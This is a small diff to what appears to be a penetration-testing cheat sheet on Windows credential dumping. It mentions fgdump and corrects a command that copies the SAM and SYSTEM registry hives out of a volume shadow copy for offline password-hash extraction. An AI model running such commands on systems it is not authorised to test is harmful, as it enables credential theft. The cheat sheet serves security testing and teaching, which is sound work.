@@ -31,7 +31,7 @@ Run fgdump to dump local hash
 
 > `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\config\SYSTEM c:\`
 
-> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\SAM c:\`
+> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\config\SAM c:\`
 
 ### Hash identification
 
